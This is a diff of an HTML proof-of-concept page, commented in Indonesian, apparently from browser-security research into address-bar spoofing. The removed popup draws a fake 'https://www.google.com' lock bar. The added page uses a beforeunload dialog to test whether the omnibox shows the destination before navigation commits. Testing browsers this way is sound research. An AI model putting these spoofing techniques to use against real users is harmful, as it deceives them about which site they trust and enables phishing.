@@ -1,19 +1,22 @@
-<!-- 13 | origin spoof - POPUP CHROMELESS | [1-CLICK]
-     GENOME  G=chromeless popup  B=window.open + features  E=bar digambar  C=click
-     MEKANISME  jendela yang dibuka dengan fitur ukuran sering kehilangan sebagian chrome.
-     Aturannya beda per engine/OS: sebagian memaksa strip origin tetap ada, sebagian tidak.
-     Perbedaan aturan itu = permukaan. Anak jendela menggambar bar sendiri dan mencetak
-     origin ASLI-nya di badan, jadi satu screenshot memuat kebohongan dan kebenarannya.
-     EXPECTED-SECURE  setiap popup, seberapa pun kecilnya, tetap menampilkan origin yang tak bisa ditulisi.
-     Nol navigasi keluar: anak jendela adalah about:blank yang mewarisi origin ini. -->
-<button onclick="go()">Run 13</button>
-<p id=r></p>
+<!-- 13 | ⭐⭐ F1 · dialog beforeunload — bar sudah berganti SEBELUM kamu memutuskan | [1-CLICK]
+     INI FLAGSHIP BATCH 13-50. Nol jaringan, nol port mati, nol DNS. Deterministik.
+     MEKANISME  saat halaman punya handler beforeunload, browser MENAHAN navigasi dan
+     menampilkan dialog "Leave site?". Tapi keputusan menampilkan dialog dibuat SETELAH
+     browser mulai memproses navigasi. Di sejumlah engine omnibox SUDAH menulis URL tujuan
+     pada saat dialog itu muncul - padahal dokumen tujuan belum ada dan mungkin tak akan pernah ada.
+     Yang membuat ini beda dari seluruh keluarga lama: penyerang TIDAK menahan jaringan.
+     Yang menahan navigasi adalah BROWSER SENDIRI, atas permintaan yang sah, selama yang
+     dibutuhkan - karena dialog menunggu manusia. Jendelanya selebar keraguan pengguna.
+     PREDIKAT  saat dialog tampil: baca omnibox. Menulis google.com? Layar masih halaman ini?
+     Lalu tekan STAY -> bar HARUS kembali. Kalau tidak kembali = bar tersangkut = temuan penuh.
+     EXPECTED-SECURE  bar tetap menulis halaman ini selama dialog, dan tetap begitu setelah Stay. -->
+<h2 style="font:20px system-ui">HALAMAN PENYERANG — perhatikan ini tidak pernah hilang</h2>
+<input id=t value="https://www.google.com/" style="width:320px;font:13px monospace">
+<button onclick="go()">Navigasi (dialog akan muncul)</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
-document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  var w = window.open('', '', 'width=460,height=300,toolbar=no,menubar=no,location=no,status=no');
-  w.document.write(
-    '<div style="font:12px system-ui;background:#f1f3f4;padding:6px;border-radius:12px">🔒 https://www.google.com</div>' +
-    '<h3>BAR DI ATAS PALSU</h3><p style="font:12px monospace">origin asli anak jendela: ' + w.location.origin + '</p>');
-}
+g.textContent = 'REAL ORIGIN: ' + location.href +
+  '\n\n1. klik tombol  2. saat dialog muncul: BACA OMNIBOX  3. tekan STAY  4. baca omnibox lagi';
+addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; return ''; });
+function go() { location.href = t.value.trim(); }
 </script>
